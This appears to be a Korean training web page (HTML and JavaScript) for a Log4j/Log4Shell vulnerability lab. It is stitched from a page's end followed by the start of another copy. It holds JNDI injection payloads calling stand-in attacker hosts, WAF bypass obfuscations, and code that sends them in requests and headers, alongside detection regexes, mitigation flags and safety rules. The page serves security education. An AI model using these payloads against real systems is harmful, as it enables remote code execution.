<div class="code-block">
    <pre><code class="language-bash"># 우회 성공 가능성 높음
    ${${lower:j}ndi:ldap://
    ${j${k8s:k5:-ndi:l}dap://
    ${${::-j}${::-n}${::-d}${::-i}:</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <!-- Detection Analysis -->
                        <div class="tab-pane fade" id="detection" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-search me-2 text-info"></i>공격 탐지 및 분석
                                </h4>
                                
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6 class="fw-bold">🔍 탐지 패턴</h6>
                                        <div class="code-block">
    <pre><code># 정규식 패턴
    \$\{jndi:(ldap|rmi|dns|nis|iiop|corba|nds|http)://
    \$\{.*:\$\{.*\}.*\}
    \$\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:
    
    # 의심스러운 문자열
    ${lower:
    ${upper:
    ${env:
    ${sys:
    ${::-</code></pre>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6 class="fw-bold">📊 탐지 통계</h6>
                                        <div class="bg-light p-3 rounded">
                                            <div class="row text-center">
                                                <div class="col-6 mb-2">
                                                    <h4 class="text-danger" id="detectionCount">0</h4>
                                                    <small>탐지된 공격</small>
                                                </div>
                                                <div class="col-6 mb-2">
                                                    <h4 class="text-warning" id="attemptCount">0</h4>
                                                    <small>시도된 공격</small>
                                                </div>
                                                <div class="col-6">
                                                    <h4 class="text-success" id="blockedCount">0</h4>
                                                    <small>차단된 공격</small>
                                                </div>
                                                <div class="col-6">
                                                    <h4 class="text-info" id="bypassCount">0</h4>
                                                    <small>우회 시도</small>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="mt-4">
                                    <h6 class="fw-bold">🎯 실시간 탐지 테스트</h6>
                                    <div class="input-group mb-3">
                                        <input type="text" class="form-control" id="detectionInput" 
                                               placeholder="탐지 테스트용 문자열 입력...">
                                        <button class="btn btn-info" onclick="testDetection()">
                                            <i class="fas fa-search me-1"></i>탐지 테스트
                                        </button>
                                    </div>
                                    <div id="detectionResult" class="mt-2"></div>
                                </div>
    
                                <div class="mt-4">
                                    <h6 class="fw-bold">📈 공격 패턴 분석</h6>
                                    <div class="table-responsive">
                                        <table class="table table-sm">
                                            <thead>
                                                <tr>
                                                    <th>패턴 유형</th>
                                                    <th>위험도</th>
                                                    <th>탐지 난이도</th>
                                                    <th>차단 가능성</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td>기본 JNDI</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-success">쉬움</span></td>
                                                    <td><span class="badge bg-success">높음</span></td>
                                                </tr>
                                                <tr>
                                                    <td>대소문자 우회</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-warning">보통</span></td>
                                                    <td><span class="badge bg-warning">보통</span></td>
                                                </tr>
                                                <tr>
                                                    <td>환경변수 우회</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-danger">어려움</span></td>
                                                    <td><span class="badge bg-danger">낮음</span></td>
                                                </tr>
                                                <tr>
                                                    <td>중첩 표현식</td>
                                                    <td><span class="badge bg-danger">Critical</span></td>
                                                    <td><span class="badge bg-danger">매우 어려움</span></td>
                                                    <td><span class="badge bg-danger">매우 낮음</span></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <!-- Defense Techniques -->
                        <div class="tab-pane fade" id="defense" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-shield-alt me-2 text-success"></i>방어 및 완화 기법
                                </h4>
                                
                                <div class="step-card severity-critical">
                                    <h6 class="fw-bold text-danger">🚨 즉시 조치 사항</h6>
                                    <ol>
                                        <li><strong>Log4j 업그레이드</strong>: 2.17.1 이상으로 즉시 업데이트</li>
                                        <li><strong>JVM 플래그 설정</strong>: <code>-Dlog4j2.formatMsgNoLookups=true</code></li>
                                        <li><strong>네트워크 차단</strong>: 아웃바운드 LDAP/RMI 연결 차단</li>
                                        <li><strong>WAF 룰 적용</strong>: JNDI 패턴 필터링 규칙 추가</li>
                                    </ol>
                                </div>
    
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="step-card">
                                            <h6 class="fw-bold">🔧 시스템 설정</h6>
                                            <div class="code-block">
    <pre><code># JVM 옵션 추가
    -Dlog4j2.formatMsgNoLookups=true
    -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
    -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
    
    # 환경변수 설정
    LOG4J_FORMAT_MSG_NO_LOOKUPS=true</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="step-card">
                                            <h6 class="fw-bold">🛡️ WAF 규칙</h6>
                                            <div class="code-block">
    <pre><code># ModSecurity 규칙 예시
    SecRule ARGS "@detectSQLi" \
        "id:100001,\
        phase:2,\
        block,\
        msg:'JNDI Injection Attack',\
        logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card">
                                    <h6 class="fw-bold">📋 보안 체크리스트</h6>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check1">
                                        <label class="form-check-label" for="check1">
                                            Log4j 버전 확인 및 업데이트
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check2">
                                        <label class="form-check-label" for="check2">
                                            JVM 보안 플래그 적용
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check3">
                                        <label class="form-check-label" for="check3">
                                            네트워크 보안 정책 검토
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check4">
                                        <label class="form-check-label" for="check4">
                                            입력 검증 및 필터링 구현
                                        </label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="check5">
                                        <label class="form-check-label" for="check5">
                                            모니터링 및 탐지 시스템 구축
                                        </label>
                                    </div>
                                </div>
    
                                <div class="alert alert-success">
                                    <h6 class="fw-bold">
                                        <i class="fas fa-lightbulb me-2"></i>보안 모범 사례
                                    </h6>
                                    <ul class="mb-0">
                                        <li>로그에 사용자 입력을 직접 기록하지 않기</li>
                                        <li>입력 데이터 검증 및 이스케이프 처리</li>
                                        <li>최소 권한 원칙 적용</li>
                                        <li>정기적인 보안 패치 및 업데이트</li>
                                        <li>보안 모니터링 및 로그 분석</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
    
                <!-- Sidebar -->
                <div class="col-lg-4">
                    <!-- Real-time Log Monitor -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-terminal me-2"></i>실시간 로그 모니터
                        </h6>
                        <div class="log-terminal" id="logTerminal">
                            <div class="log-entry log-info">[시스템] Log4j 취약점 실습 환경 초기화됨</div>
                            <div class="log-entry log-warn">[경고] 취약한 Log4j 2.14.1 버전 실행 중</div>
                            <div class="log-entry log-info">[시스템] JNDI 룩업 활성화됨 (formatMsgNoLookups=false)</div>
                            <div class="log-entry log-info">[시스템] 실습 모니터링 시작...</div>
                        </div>
                        <div class="text-center mt-2">
                            <button class="btn btn-outline-success btn-sm" onclick="clearLogs()">
                                <i class="fas fa-trash me-1"></i>로그 초기화
                            </button>
                            <button class="btn btn-outline-info btn-sm" onclick="toggleAutoScroll()">
                                <i class="fas fa-arrows-alt-v me-1"></i>자동 스크롤
                            </button>
                        </div>
                    </div>
    
                    <!-- Attack Statistics -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-chart-bar me-2"></i>공격 통계
                        </h6>
                        <div class="row text-center">
                            <div class="col-6 mb-3">
                                <div class="text-danger">
                                    <i class="fas fa-crosshairs fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="totalAttacks">0</h4>
                                    <small>총 공격 시도</small>
                                </div>
                            </div>
                            <div class="col-6 mb-3">
                                <div class="text-warning">
                                    <i class="fas fa-exclamation-triangle fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="detectedAttacks">0</h4>
                                    <small>탐지된 공격</small>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-success">
                                    <i class="fas fa-shield-alt fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="blockedAttacks">0</h4>
                                    <small>차단된 공격</small>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-info">
                                    <i class="fas fa-eye fa-2x"></i>
                                    <h4 class="fw-bold mt-2" id="bypassAttempts">0</h4>
                                    <small>우회 시도</small>
                                </div>
                            </div>
                        </div>
                    </div>
    
                    <!-- Quick Actions -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-bolt me-2"></i>빠른 실습
                        </h6>
                        <button class="btn btn-danger w-100 mb-2" onclick="runBasicAttack()">
                            <i class="fas fa-play me-2"></i>기본 공격 실행
                        </button>
                        <button class="btn btn-warning w-100 mb-2" onclick="runBypassAttack()">
                            <i class="fas fa-rocket me-2"></i>우회 공격 실행
                        </button>
                        <button class="btn btn-info w-100 mb-2" onclick="runDetectionTest()">
                            <i class="fas fa-search me-2"></i>탐지 테스트
                        </button>
                        <button class="btn btn-success w-100" onclick="showDefenseDemo()">
                            <i class="fas fa-shield-alt me-2"></i>방어 시연
                        </button>
                    </div>
    
                    <!-- Learning Resources -->
                    <div class="lab-container">
                        <h6 class="fw-bold mb-3">
                            <i class="fas fa-book me-2"></i>학습 자료
                        </h6>
                        <ul class="list-unstyled">
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('cve')">
                                    <i class="fas fa-bug me-2"></i>CVE-2021-44228 상세 정보
                                </a>
                            </li>
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('timeline')">
                                    <i class="fas fa-clock me-2"></i>취약점 발견 타임라인
                                </a>
                            </li>
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('impact')">
                                    <i class="fas fa-globe me-2"></i>실제 피해 사례
                                </a>
                            </li>
                            <li class="mb-2">
                                <a href="#" class="text-decoration-none" onclick="showResource('tools')">
                                    <i class="fas fa-tools me-2"></i>탐지 및 스캔 도구
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    
        <!-- Safety Guide Modal -->
        <div class="modal fade" id="safetyGuideModal" tabindex="-1">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">
                            <i class="fas fa-shield-alt me-2"></i>안전 수칙 및 주의사항
                        </h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <div class="alert alert-danger">
                            <h6 class="fw-bold">⚠️ 절대 금지 사항</h6>
                            <ul class="mb-0">
                                <li>실제 운영 시스템에서 이 기법 사용</li>
                                <li>타인의 시스템에 대한 무단 테스트</li>
                                <li>악의적 목적으로 취약점 악용</li>
                                <li>교육 목적 외의 사용</li>
                            </ul>
                        </div>
    
                        <div class="alert alert-warning">
                            <h6 class="fw-bold">🔒 보안 환경 요구사항</h6>
                            <ul class="mb-0">
                                <li>격리된 네트워크 환경에서만 실습</li>
                                <li>외부 인터넷 연결 차단 권장</li>
                                <li>실습 후 시스템 초기화</li>
                                <li>로그 데이터 보안 관리</li>
                            </ul>
                        </div>
    
                        <div class="alert alert-info">
                            <h6 class="fw-bold">📚 교육적 사용</h6>
                            <p class="mb-0">이 실습 환경은 보안 교육 및 인식 제고를 위해 제작되었습니다. 
                            사이버 보안 전문가 양성과 방어 능력 향상이 목적입니다.</p>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">닫기</button>
                        <button type="button" class="btn btn-danger" onclick="acknowledgeRisks()">
                            <i class="fas fa-check me-1"></i>위험성을 인지했습니다
                        </button>
                    </div>
                </div>
            </div>
        </div>
    
        <!-- Bootstrap JS -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Prism.js for code highlighting -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    
        <!-- Custom JavaScript -->
        <script>
            // Global variables
            let attackCount = 0;
            let detectionCount = 0;
            let blockedCount = 0;
            let bypassCount = 0;
            let autoScroll = true;
            let currentStep = 1;
    
            // Attack patterns
            const attackPatterns = {
                ldap: '${jndi:ldap://evil.com/exploit}',
                rmi: '${jndi:rmi://malicious.server:1099/payload}',
                dns: '${jndi:dns://exfiltrate.attacker.com/data}',
                http: '${jndi:ldap://attacker.com:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}',
                bypass1: '${${lower:jndi}:${lower:ldap}://bypass.evil.com/exploit}',
                bypass2: '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//env.attacker.com/a}',
                bypass3: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://nested.evil.com/exploit}',
                bypass4: '${jndi:ldap://base64.evil.com/${base64:dGVzdA==}}'
            };
    
            // Initialize the lab
            document.addEventListener('DOMContentLoaded', function() {
                initializeLab();
                startLogSimulation();
                updateProgress();
            });
    
            // Initialize lab environment
            function initializeLab() {
                addLogEntry('실습 환경이 초기화되었습니다.', 'info');
                addLogEntry('Log4j 2.14.1 (취약한 버전) 로드됨', 'warn');
                addLogEntry('JNDI 룩업 기능 활성화됨', 'warn');
                addLogEntry('실습 준비 완료 - 공격을 시작할 수 있습니다', 'info');
            }
    
            // Set payload in attack input
            function setPayload(type) {
                const payload = attackPatterns[type];
                document.getElementById('attackPayload').value = payload;
                addLogEntry(`공격 패턴 설정: ${type.toUpperCase()}`, 'info');
            }
    
            // Execute attack
            function executeAttack() {
                const target = document.getElementById('attackTarget').value;
                const payload = document.getElementById('attackPayload').value;
                
                if (!payload.trim()) {
                    showAlert('공격 페이로드를 입력하거나 선택해주세요.', 'warning');
                    return;
                }
    
                attackCount++;
                updateStats();
                updateProgress();
    
                addLogEntry(`[공격 ${attackCount}] 대상: ${target}`, 'attack');
                addLogEntry(`[공격 ${attackCount}] 페이로드: ${payload}`, 'attack');
    
                // 실제 API 호출
                const requestData = target.includes('headers') ? 
                    {} : { input: payload, q: payload };
    
                fetch(target, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': payload // 헤더 공격용
                    },
                    body: JSON.stringify(requestData)
                })
                .then(response => {
                    addLogEntry(`[공격 ${attackCount}] 응답 상태: ${response.status}`, 'info');
                    
                    // 패턴 분석
                    analyzeAttackPattern(payload);
                    
                    return response.text();
                })
                .then(data => {
                    addLogEntry(`[공격 ${attackCount}] 서버 응답 수신됨`, 'info');
                    showAttackResult(payload);
                })
                .catch(error => {
                    addLogEntry(`[공격 ${attackCount}] 오류: ${error.message}`, 'error');
                    showAttackResult(payload);
                });
            }
    
            // Analyze attack pattern
            function analyzeAttackPattern(payload) {
                const patterns = [
                    { regex: /\$\{jndi:ldap:/, type: 'LDAP 공격', severity: 'critical' },
                    { regex: /\$\{jndi:rmi:/, type: 'RMI 공격', severity: 'critical' },
                    { regex: /\$\{jndi:dns:/, type: 'DNS 유출', severity: 'high' },
                    { regex: /\$\{.*lower.*\}/, type: '대소문자 우회', severity: 'high' },
                    { regex: /\$\{.*env.*\}/, type: '환경변수 우회', severity: 'critical' },
                    { regex: /\$\{.*::-.*\}/, type: '중첩 우회', severity: 'critical' }
                ];
    
                let detected = false;
                patterns.forEach(pattern => {
                    if (pattern.regex.test(payload)) {
                        detectionCount++;
                        detected = true;
                        addLogEntry(`[탐지] ${pattern.type} 패턴 감지됨 (위험도: ${pattern.severity})`, 'warn');
                        showDetectionAlert(pattern.type, pattern.severity);
                    }
                });
    
                if (payload.includes('${') && payload.includes('}')) {
                    if (payload.toLowerCase().includes('bypass') || 
                        payload.includes('${env:') || 
                        payload.includes('${::-')) {
                        bypassCount++;
                        addLogEntry('[우회] 고급 우회 기법 시도 감지됨', 'error');
                    }
                }
    
                updateStats();
            }
    
            // Show attack result
            function showAttackResult(payload) {
                if (detectJNDIPattern(payload)) {
                    showFloatingAlert(`JNDI 패턴 감지: ${payload.substring(0, 50)}...`, 'danger');
                    addLogEntry('⚠️ 취약점 실습 성공: JNDI 패턴이 로깅되었습니다', 'attack');
                    addLogEntry('실제 환경에서는 외부 서버 연결이 시도됩니다', 'warn');
                } else {
                    addLogEntry('정상적인 입력으로 처리되었습니다', 'info');
                }
            }
    
            // Detection functions
            function detectJNDIPattern(input) {
                const jndiPatterns = [
                    /\$\{jndi:/i,
                    /\$\{.*j.*n.*d.*i.*:/i,
                    /ldap:\/\//i,
                    /rmi:\/\//i,
                    /dns:\/\//i
                ];
                
                return jndiPatterns.some(pattern => pattern.test(input));
            }
    
            function testDetection() {
                const input = document.getElementById('detectionInput').value;
                const resultDiv = document.getElementById('detectionResult');
                
                if (detectJNDIPattern(input)) {
                    resultDiv.innerHTML = `
                        <div class="alert alert-danger">
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            <strong>위험:</strong> JNDI 패턴이 감지되었습니다!
                        </div>
                    `;
                    detectionCount++;
                } else {
                    resultDiv.innerHTML = `
                        <div class="alert alert-success">
                            <i class="fas fa-check me-2"></i>
                            <strong>안전:</strong> 의심스러운 패턴이 없습니다.
                        </div>
                    `;
                }
                
                updateStats();
            }
    
            // Quick attack functions
            function runBasicAttack() {
                setPayload('ldap');
                setTimeout(() => executeAttack(), 500);
            }
    
            function runBypassAttack() {
                setPayload('bypass3');
                setTimeout(() => executeAttack(), 500);
            }
    
            function runDetectionTest() {
                document.getElementById('detectionInput').value = attackPatterns.bypass1;
                testDetection();
            }
    
            function showDefenseDemo() {
                addLogEntry('=== 방어 기법 시연 시작 ===', 'info');
                addLogEntry('1. JVM 플래그 적용: -Dlog4j2.formatMsgNoLookups=true', 'info');
                addLogEntry('2. JNDI 패턴 필터링 활성화', 'info');
                addLogEntry('3. 네트워크 차단 규칙 적용', 'info');
                addLogEntry('방어 기법이 적용되면 공격이 차단됩니다', 'info');
                
                blockedCount += 3;
                updateStats();
            }
    
            // Log management
            function addLogEntry(message, type = 'info') {
                const terminal = document.getElementById('logTerminal');
                const timestamp = new Date().toLocaleTimeString();
                const logClass = `log-${type}`;
                
                const logEntry = document.createElement('div');
                logEntry.className = `log-entry ${logClass}`;
                logEntry.innerHTML = `[${timestamp}] ${message}`;
                
                terminal.appendChild(logEntry);
                
                if (autoScroll) {
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                // 로그 개수 제한
                if (terminal.children.length > 100) {
                    terminal.removeChild(terminal.firstChild);
                }
            }
    
            function clearLogs() {
                document.getElementById('logTerminal').innerHTML = '';
                addLogEntry('로그가 초기화되었습니다', 'info');
            }
    
            function toggleAutoScroll() {
                autoScroll = !autoScroll;
                addLogEntry(`자동 스크롤 ${autoScroll ? '활성화' : '비활성화'}됨`, 'info');
            }
    
            // Statistics and progress
            function updateStats() {
                document.getElementById('totalAttacks').textContent = attackCount;
                document.getElementById('detectedAttacks').textContent = detectionCount;
                document.getElementById('blockedAttacks').textContent = blockedCount;
                document.getElementById('bypassAttempts').textContent = bypassCount;
                
                // Update detection stats
                document.getElementById('detectionCount').textContent = detectionCount;
                document.getElementById('attemptCount').textContent = attackCount;
                document.getElementById('blockedCount').textContent = blockedCount;
                document.getElementById('bypassCount').textContent = bypassCount;
            }
    
            function updateProgress() {
                const steps = document.querySelectorAll('.progress-step');
                
                // 단계별 진행 상황 업데이트
                if (attackCount >= 1) {
                    updateStepStatus(1, 'completed');
                    currentStep = Math.max(currentStep, 2);
                }
                if (attackCount >= 3) {
                    updateStepStatus(2, 'completed');
                    currentStep = Math.max(currentStep, 3);
                }
                if (bypassCount >= 1) {
                    updateStepStatus(3, 'completed');
                    currentStep = Math.max(currentStep, 4);
                }
                if (detectionCount >= 5) {
                    updateStepStatus(4, 'completed');
                }
                
                // 현재 단계 표시
                if (currentStep <= 4) {
                    updateStepStatus(currentStep, 'active');
                }
            }
    
            function updateStepStatus(stepNumber, status) {
                const step = document.querySelector(`[data-step="${stepNumber}"]`);
                if (step) {
                    step.className = `progress-step ${status}`;
                }
            }
    
            // Alert and notification functions
            function showFloatingAlert(message, type) {
                const alertsContainer = document.getElementById('floatingAlerts');
                const alert = document.createElement('div');
                alert.className = 'detection-alert';
                alert.innerHTML = `
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            ${message}
                        </div>
                        <button class="btn btn-sm btn-outline-light" onclick="this.parentElement.parentElement.remove()">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                `;
                
                alertsContainer.appendChild(alert);
                
                // 5초 후 자동 제거
                setTimeout(() => {
                    if (alert.parentElement) {
                        alert.remove();
                    }
                }, 5000);
            }
    
            function showDetectionAlert(attackType, severity) {
                const severityColors = {
                    critical: 'danger',
                    high: 'warning',
                    medium: 'info',
                    low: 'secondary'
                };
                
                showFloatingAlert(`${attackType} 공격 탐지됨 (${severity})`, severityColors[severity]);
            }
    
            function showAlert(message, type = 'info') {
                const alertClass = {
                    'success': 'alert-success',
                    'danger': 'alert-danger',
                    'warning': 'alert-warning',
                    'info': 'alert-info'
                }[type] || 'alert-info';
    
                const alertHtml = `
                    <div class="alert ${alertClass} alert-dismissible fade show" role="alert">
                        ${message}
                        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                    </div>
                `;
    
                document.querySelector('.container').insertAdjacentHTML('afterbegin', alertHtml);
                
                setTimeout(() => {
                    const alert = document.querySelector(`.${alertClass}`);
                    if (alert) alert.remove();
                }, 5000);
            }
    
            // Modal functions
            function showSafetyGuide() {
                new bootstrap.Modal(document.getElementById('safetyGuideModal')).show();
            }
    
            function acknowledgeRisks() {
                bootstrap.Modal.getInstance(document.getElementById('safetyGuideModal')).hide();
                addLogEntry('사용자가 위험성을 인지하고 실습을 진행합니다', 'warn');
                showAlert('안전 수칙을 숙지하셨습니다. 실습을 시작하세요!', 'success');
            }
    
            // Resource functions
            function showResource(type) {
                const resources = {
                    cve: {
                        title: 'CVE-2021-44228 상세 정보',
                        content: 'Apache Log4j2 <=2.14.1에서 발견된 JNDI injection 취약점으로, 원격 코드 실행이 가능합니다.'
                    },
                    timeline: {
                        title: '취약점 발견 타임라인',
                        content: '2021년 12월 9일 공개, 12월 10일 대규모 공격 시작, 수 시간 내에 전 세계적으로 확산되었습니다.'
                    },
                    impact: {
                        title: '실제 피해 사례',
                        content: 'Minecraft 서버, Tesla, Apple iCloud, Steam 등 주요 서비스들이 영향을 받았습니다.'
                    },
                    tools: {
                        title: '탐지 및 스캔 도구',
                        content: 'log4j-scanner, Nuclei, OWASP ZAP 등의 도구로 취약점을 탐지할 수 있습니다.'
                    }
                };
                
                const resource = resources[type];
                if (resource) {
                    showAlert(`<strong>${resource.title}:</strong> ${resource.content}`, 'info');
                }
            }
    
            // Simulation functions
            function startLogSimulation() {
                const simulationEvents = [
                    '네트워크 모니터링 시작됨',
                    'JNDI 패턴 감지 엔진 활성화',
                    '취약점 스캐너 준비 완료',
                    '실습 환경 최종 점검 완료'
                ];
    
                simulationEvents.forEach((event, index) => {
                    setTimeout(() => {
                        addLogEntry(event, 'info');
                    }, (index + 1) * 2000);
                });
            }
    
            // 실시간 보안 이벤트 시뮬레이션
            setInterval(function() {
                if (Math.random() < 0.1 && attackCount > 0) { // 10% 확률로 보안 이벤트
                    const events = [
                        '외부 LDAP 연결 시도 감지됨',
                        '의심스러운 DNS 쿼리 탐지됨',
                        'RMI 연결 차단됨',
                        'JNDI 패턴 필터링 동작함',
                        '보안 모니터링 시스템 정상 동작 중'
                    ];
                    
                    const randomEvent = events[Math.floor(Math.random() * events.length)];
                    addLogEntry(`[보안] ${randomEvent}`, 'warn');
                }
            }, 10000); // 10초마다 체크
    
            // Tab switching event handling
            document.querySelectorAll('[data-bs-toggle="pill"]').forEach(tab => {
                tab.addEventListener('shown.bs.tab', function(e) {
                    const targetTab = e.target.getAttribute('data-bs-target');
                    addLogEntry(`실습 탭 변경: ${targetTab.replace('#', '').replace('-', ' ')}`, 'info');
                });
            });
    
            // 키보드 단축키
            document.addEventListener('keydown', function(e) {
                // Ctrl + Enter: 공격 실행
                if (e.ctrlKey && e.key === 'Enter') {
                    e.preventDefault();
                    executeAttack();
                }
                
                // Ctrl + L: 로그 초기화
                if (e.ctrlKey && e.key === 'l') {
                    e.preventDefault();
                    clearLogs();
                }
                
                // Ctrl + 1-4: 빠른 공격 패턴 설정
                if (e.ctrlKey && ['1', '2', '3', '4'].includes(e.key)) {
                    e.preventDefault();
                    const patterns = ['ldap', 'rmi', 'dns', 'http'];
                    setPayload(patterns[parseInt(e.key) - 1]);
                }
            });
    
            // 페이지 언로드 시 경고
            window.addEventListener('beforeunload', function(e) {
                if (attackCount > 0) {
                    const message = '실습 세션이 진행 중입니다. 정말 페이지를 떠나시겠습니까?';
                    e.returnValue = message;
                    return message;
                }
            });
    
            // 페이지 로드 완료 시 최종 초기화
            window.addEventListener('load', function() {
                addLogEntry('페이지 로드 완료 - 모든 시스템 준비됨', 'info');
                addLogEntry('실습을 시작하려면 공격 패턴을 선택하고 "공격 실행"을 클릭하세요', 'info');
                
                // 5초 후 자동으로 첫 번째 실습 가이드 표시
                setTimeout(() => {
                    if (attackCount === 0) {
                        showAlert('💡 실습 팁: 먼저 "LDAP 공격" 버튼을 클릭해서 기본 공격을 체험해보세요!', 'info');
                    }
                }, 5000);
            });
    
            // 접근성 개선: 스크린 리더 지원
            function announceForScreenReader(message) {
                const announcement = document.createElement('div');
                announcement.setAttribute('aria-live', 'polite');
                announcement.setAttribute('aria-atomic', 'true');
                announcement.className = 'sr-only';
                announcement.textContent = message;
                document.body.appendChild(announcement);
                
                setTimeout(() => {
                    document.body.removeChild(announcement);
                }, 1000);
            }
    
            // 공격 실행 시 스크린 리더 알림
            const originalExecuteAttack = executeAttack;
            executeAttack = function() {
                announceForScreenReader('Log4j 공격이 실행되었습니다.');
                originalExecuteAttack();
            };
        </script>
    </body>
    </html>
                <!DOCTYPE html>
    <html lang="ko" xmlns:th="http://www.thymeleaf.org">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Log4j 취약점 실습실 - SecureLogistics</title>
        
        <!-- Bootstrap 5 CSS -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <!-- Font Awesome Icons -->
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
        <!-- Prism.js for code highlighting -->
        <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
        
        <!-- Custom CSS -->
        <style>
            :root {
                --vuln-primary: #e74c3c;
                --vuln-secondary: #f39c12;
                --vuln-danger: #c0392b;
                --vuln-warning: #f1c40f;
                --vuln-dark: #2c3e50;
                --vuln-success: #27ae60;
            }
    
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
    
            .vuln-header {
                background: linear-gradient(135deg, var(--vuln-danger), var(--vuln-secondary));
                color: white;
                padding: 3rem 0;
                margin-bottom: 2rem;
                position: relative;
                overflow: hidden;
            }
    
            .vuln-header::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
                opacity: 0.3;
            }
    
            .warning-banner {
                background: linear-gradient(45deg, #ff6b6b, #feca57);
                color: white;
                padding: 1.5rem;
                border-radius: 15px;
                margin-bottom: 2rem;
                border: 3px solid rgba(255, 255, 255, 0.3);
                box-shadow: 0 8px 25px rgba(255, 107, 107, 0.3);
                animation: pulse-warning 3s infinite;
            }
    
            @keyframes pulse-warning {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.02); }
            }
    
            .lab-container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 2rem;
                margin-bottom: 2rem;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
    
            .attack-section {
                background: #1a1a1a;
                border-radius: 15px;
                padding: 1.5rem;
                margin-bottom: 2rem;
                border-left: 5px solid var(--vuln-danger);
            }
    
            .attack-input {
                background: #2d2d2d;
                border: 2px solid #444;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                border-radius: 10px;
                padding: 1rem;
                transition: all 0.3s ease;
            }
    
            .attack-input:focus {
                border-color: var(--vuln-danger);
                box-shadow: 0 0 0 0.3rem rgba(231, 76, 60, 0.25);
                background: #333;
            }
    
            .payload-btn {
